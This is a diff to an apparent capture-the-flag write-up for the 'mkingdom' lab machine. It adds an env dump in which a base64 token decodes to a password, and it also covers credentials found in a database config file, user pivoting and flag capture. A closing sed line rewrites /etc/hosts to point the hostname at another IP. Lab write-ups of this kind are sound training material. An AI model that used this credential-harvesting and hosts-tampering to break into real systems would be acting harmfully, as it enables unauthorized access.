@@ -97,9 +97,42 @@ Got a password from the mkingdom database in /concrete/config/database.php
 
 'password' 'toadisthebest'
 
-I logged into toad and ran linpeas again and ididn't get much out of it. I checked the env and found a password has that translated to 'ikaTeNTANtES'
+I logged into toad and ran linpeas again and ididn't get much out of it. I checked the env 
+
+```shell-session
+toad@mkingdom:~$ env
+env
+APACHE_PID_FILE=/var/run/apache2/apache2.pid
+XDG_SESSION_ID=c2
+SHELL=/bin/bash
+APACHE_RUN_USER=www-data
+OLDPWD=/tmp
+USER=toad
+LS_COLORS=
+PWD_token=aWthVGVOVEFOdEVTCg==
+MAIL=/var/mail/toad
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
+APACHE_LOG_DIR=/var/log/apache2
+PWD=/home/toad
+LANG=en_US.UTF-8
+APACHE_RUN_GROUP=www-data
+HOME=/home/toad
+SHLVL=2
+LOGNAME=toad
+LESSOPEN=| /usr/bin/lesspipe %s
+XDG_RUNTIME_DIR=/run/user/1002
+APACHE_RUN_DIR=/var/run/apache2
+APACHE_LOCK_DIR=/var/lock/apache2
+LESSCLOSE=/usr/bin/lesspipe %s %s
+_=/usr/bin/env
+```
+and found a password hash that translated to `ikaTeNTANtES'
 
 I was able to use it to log into mario, I couldn't read the user.txt in mario's home folder but I remembered seeing that toad's ran with root privs on linpeas earlier.
 
 I changed to toad and grabbed the flag.
+
+
+
+cat /etc/hosts | sed 's/127.0.1.1\t\mkingdom.thm/10.13.57.25\t\mkingdom.thm/g' > /tmp/replace_hosts
 
